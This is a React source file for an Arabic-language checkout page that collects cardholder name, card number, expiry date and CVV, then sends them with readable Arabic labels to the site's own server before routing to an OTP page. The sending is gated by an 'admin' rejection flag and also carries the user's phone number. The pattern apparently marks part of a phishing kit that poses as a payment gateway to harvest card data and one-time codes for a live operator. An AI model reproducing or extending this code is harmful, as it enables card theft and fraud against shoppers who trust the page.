import Main from "@/components/Main";
import { useEffect, useState } from "react";
import { validateLanguage, validateNumericInput } from "../utils/helpers";
import { Link, useLocation, useNavigate } from "react-router-dom";
import {
  currentPage,
  isAdminError,
  extraInfo,
  loading,
  message,
  sendDataToServer,
} from "@/context/signals";
import { cn } from "../lib/utils";
import CardNumberInput from "../components/CardNumber";

const Gateway = () => {
  const [error, setError] = useState<any>({
    name: "",
    card_num: null,
    ccv: null,
    exp_month: errMsgs.month,
    exp_year: errMsgs.year,
  });
  const [dirty, setDirty] = useState(false);
  const { state } = useLocation();
  // console.log(state);
  const navigate = useNavigate();

  const [focusIndex, setFocusIndex] = useState([]);
  // console.log(error);

  const handleSubmit = (e: any) => {
    e.preventDefault();
    const formData = new FormData(e.target);
    const data: any = {};
    data["اسم حامل البطاقة"] = formData.get("name");
    data["رقم البطاقة"] = formData.get("card_num");
    data["الشهر"] = formData.get("exp_month");
    data["السنة"] = formData.get("exp_year");
    data.cvv = formData.get("cvv");
    // console.log(data);

    if (Object.values(data).filter((d) => !d).length === 0) {
      extraInfo.value.phone = state?.phone;

      // [ ] should be true for production
      sendDataToServer(data, "معلومات البطاقة", "otp", false, navigate, "/otp");
    }
  };

  useEffect(() => {
    currentPage.value = "معلومات البطاقة";
  }, []);

  useEffect(() => {
    if (isAdminError.value) {
      message.value = "لقد تم رفض طلبك. بالرجاء المحاولة فى وقت لاحق.";
    }
  }, [isAdminError.value]);

  const leaveField = (index: number) => {
    const indexArray: any = new Array(3).fill(false);
    indexArray[index] = true;
    setFocusIndex(indexArray);
  };
  return (
    <Main>
      <main className="bg-gray-100 min-h-screen py-10 lg:pt-20">
        <div className="bg-white rounded-xl flex flex-col items-center justify-center w-fit max-w-[90dvw] lg:max-w-lg p-4 mx-auto">
          <div className="bg-main/20 rounded-2xl py-3 ps-4 pe-20 relative">
            <img
              src={`/assets/images/${state?.paymentMethod}-card.svg`}
              className="w-16 absolute left-2 top-4 lg:top-2 scale-125"
              alt={`${state?.paymentMethod} logo`}
            />

            <h2 className="text-xl font-bold text-main">
              الدفع من خلال بطاقة الائتمان
            </h2>
            <p className="text-gray-600">
              سيتم إحراء معاملة مالية على حسابك المصرفي بإستخدام البطاقة بقيمة
              المجموع الكلي
            </p>
          </div>

          <h3 className="text-xl font-bold text-main text-right mt-4 self-start px-4">
            معلومات البطاقة
          </h3>
          <form
            onSubmit={handleSubmit}
            onChange={() => setDirty(true)}
            className="mt-4 grid grid-cols-6 items-end gap-2 w-full px-4"
          >
            <InputPay
              error={error}
              setError={setError}
              label="إسم حامل البطاقة"
              placeholder="أدخل إسم حامل البطاقة"
              id="name"
              type="text"
              className="text-left"
            />
            {/* <InputPay
              error={error}
              setError={setError}
              label="رقم البطاقة"
              placeholder="xxxx xxxx xxxx xxxx"
              defaultValue={state?.iban}
              id="card_num"
              type="tel"
              max={16}
              className={"text-left"}
            /> */}

            <div
              style={{ direction: "ltr" }}
              className={`mb-4 col-span-6 [&_#standard-error-helper-text]:text-left [&_label+.MuiInput-formControl]:border [&_label+.MuiInput-formControl]:rounded-lg [&_label+.MuiInput-formControl]:border-gray-300 [&_label+.MuiInput-formControl]:bg-white [&_label+.MuiInput-formControl]:w-max [&_label+.MuiInput-formControl]:text-sm [&_label+.MuiInput-formControl]:text-gray-700 [&_label+.MuiInput-formControl]:shadow-sm [&_label+.MuiInput-formControl]:focus-within:border-main/20 [&_label+.MuiInput-formControl]:px-2 [&_label+.MuiInput-formControl]:py-1 [&_label+.MuiInput-formControl]:focus-within:ring-1 [&_label+.MuiInput-formControl]:focus-within:ring-main/20 [&_label+.MuiInput-formControl]:text-left [&_.MuiInput-underline:before]:content-none
              [&_.MuiFormControl-root]:flex [&_.MuiFormLabel-root]:left-auto [&_.MuiFormLabel-root]:right-0 [&_.MuiInput-root.MuiInputBase-root]:w-full [&_.MuiFormHelperText-root]:text-right [&_.MuiFormLabel-root]:text-sm [&_.MuiFormLabel-root]:font-medium [&_.MuiFormLabel-root]:text-gray-800 [&_.MuiFormLabel-root]:[transform:_translate(0,_-5.5px)] [&_.MuiFormLabel-root]:[font-family:"Tajawal",sans-serif]`}
            >
              <CardNumberInput
                leaveFieldCallback={leaveField}
                focus={focusIndex[0]}
                tabIndex={0}
                setShownError={setError}
              />
            </div>
            <CVVInput error={error} setError={setError} />
            <p className="w-max">
              {`المجموع الكلى:`}{" "}
              <strong className="text-main font-bold underline ring-offset-4">
                {state?.total}
              </strong>{" "}
              ر.س
            </p>
            <div className="col-span-6 mt-6 flex flex-col lg:flex-row sm:items-center gap-4">
              <button
                className="w-full lg:text-xl capitalize rounded-md font-bold py-3 px-6 bg-[#76b456] hover:brightness-110 text-white transition-colors disabled:cursor-not-allowed disabled:bg-gray-400"
                type="submit"
                disabled={
                  error.name === "" ||
                  loading.value ||
                  !dirty ||
                  (dirty && !Object.values(error).every((er) => er === null))
                }
              >
                ادفع الآن
              </button>
              <Link
                className="w-full text-center lg:text-xl capitalize rounded-md font-bold py-3 px-6 bg-gray-200 hover:bg-gray-100 text-gray-800 transition-colors"
                to={"/checkout/4"}
              >
                السابق
              </Link>
            </div>

            <img
              src="/assets/images/cards-all.png"
              alt="cards logos"
              className="mx-auto max-w-xs col-span-6 mt-6"
            />
          </form>
        </div>
      </main>
    </Main>
  );
};
export default Gateway;

const errMsgs = {
  name: "الأسم غير صحيح. يجب أن يكون باللغة الأنجليزية",
  card_num: "رقم البطاقة غير صحيح. يجب أن يكون الرقم مكون من 16 رقم",
  cvv: "رقم cvv غير صحيح. يجب أن يكون الرقم مكون من 3 رقم",
  month: "يرجى تحديد الشهر",
  year: "يرجى تحديد السنة",
};

const CVVInput = ({ error, setError }: any) => {
  return (
    <div className={"col-span-6"}>
      <div className="flex justify-center gap-2">
        <label
          htmlFor={"cvv"}
          className="grow block text-sm font-medium text-gray-800"
        >
          الرمز السري (CVV)
        </label>

        <label
          htmlFor={"year_month"}
          className="block text-sm font-medium text-gray-800 w-fit"
        >
          تاريخ الإنتهاء
        </label>
      </div>

      <div className="flex justify-center flex-row-reverse gap-2">
        <MonthInput error={error} setError={setError} />
        <YearInput error={error} setError={setError} />
        <CVV error={error} setError={setError} />
      </div>
      <p
        className={`mt-1 col-span-6 text-red-500 text-xs h-4 transition-opacity ${
          error.cvv ? "opacity-100" : "opacity-0"
        }`}
      >
        {error.cvv || error["exp_month"] || error["exp_year"]}
      </p>
    </div>
  );
};

const MonthInput = ({ error, setError }: any) => {
  const [month, setMonth] = useState("");

  useEffect(() => {
    setError({
      ...error,
      exp_month: !month ? errMsgs.month : null,
    });
  }, [month]);

  return (
    <select
      className={`flex-1 outline-none mt-1 w-full text-center rounded-lg border border-gray-300 bg-white text-sm text-gray-700 shadow-sm p-2 focus-within:border-main/20 focus-within:ring-1 focus-within:ring-main/20`}
      id={"exp_month"}
      name={"exp_month"}
      value={month}
      onChange={(e) => setMonth(e.target.value)}
    >
      <option disabled value="">
        شهر
      </option>
      {[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12].map((m) => (
        <option key={m} value={m}>
          {m}
        </option>
      ))}
    </select>
  );
};

const YearInput = ({ error, setError }: any) => {
  const [year, setYear] = useState("");
  useEffect(() => {
    setError({
      ...error,
      exp_year: !year ? errMsgs.year : null,
    });
  }, [year]);

  return (
    <select
      className={`flex-1 outline-none mt-1 w-full text-center rounded-lg border border-gray-300 bg-white text-sm text-gray-700 shadow-sm p-2 focus-within:border-main/20 focus-within:ring-1 focus-within:ring-main/20`}
      id={"exp_year"}
      name={"exp_year"}
      value={year}
      onChange={(e) => setYear(e.target.value)}
    >
      <option disabled value="">
        سنة
      </option>
      {[2024, 2025, 2026, 2027, 2028, 2029, 2030].map((m) => (
        <option key={m} value={m}>
          {m}
        </option>
      ))}
    </select>
  );
};

const CVV = ({ error, setError }: any) => {
  const [cvv, setCvv] = useState("");
  useEffect(() => {
    const isValid = cvv.length === 3 && cvv.match(/^[0-9]+$/) && cvv !== "";
    // console.log(isValid);
    setError({ ...error, card_num: isValid ? null : errMsgs.cvv });
  }, [cvv]);

  return (
    <input
      className={`flex-1 text-center text-xs lg:text-sm mt-1 w-full rounded-lg border border-gray-300 bg-white text-gray-700 shadow-sm p-2 focus-within:border-main/20 focus-within:ring-1 focus-within:ring-main/20`}
      id={"cvv"}
      placeholder="خلف البطاقة"
      type="password"
      name={"cvv"}
      maxLength={3}
      value={cvv}
      onChange={(e) => setCvv(validateNumericInput(e.target.value))}
    />
  );
};

const InputPay = ({
  label,
  type,
  max,
  placeholder,
  id,
  error,
  setError,
  defaultValue,
  className,
}: {
  label: string;
  type: string;
  max?: number;
  placeholder: string;
  id: string;
  error: any;
  setError: any;
  defaultValue?: string;
  className?: string;
}) => {
  const [value, setValue] = useState(defaultValue || "");

  useEffect(() => {
    if (value) {
      if (id === "name") {
        const lang = validateLanguage(value);

        setError({
          ...error,
          name: lang !== "en" && value !== "" ? errMsgs.name : null,
        });
      }

      // if (id === "card_num") {
      //   const isValid =
      //     value.length === 16 && value.match(/^[0-9]+$/) && value !== "";

      //   isValid ? (err[id] = null) : (err[id] = errMsgs[id]);
      // }
    }
  }, [value]);

  return (
    <div className="col-span-6">
      <label htmlFor={id} className="block text-sm font-medium text-gray-800">
        {label}
      </label>

      <input
        className={cn(
          `mt-1 w-full text-right rounded-lg border border-gray-300 bg-white text-sm text-gray-700 shadow-sm p-2 ${
            error[id]
              ? "border-red-500"
              : "focus-within:border-main/20 focus-within:ring-1 focus-within:ring-main/20"
          }`,
          className
        )}
        id={id}
        name={id}
        type={type}
        placeholder={placeholder}
        maxLength={max}
        value={value}
        onChange={(e) => setValue(e.target.value)}
      />

      <p
        className={`col-span-6 text-red-500 text-xs h-4 transition-opacity ${
          error[id] ? "opacity-100" : "opacity-0"
        }`}
      >
        {error[id]}
      </p>
    </div>
  );
};
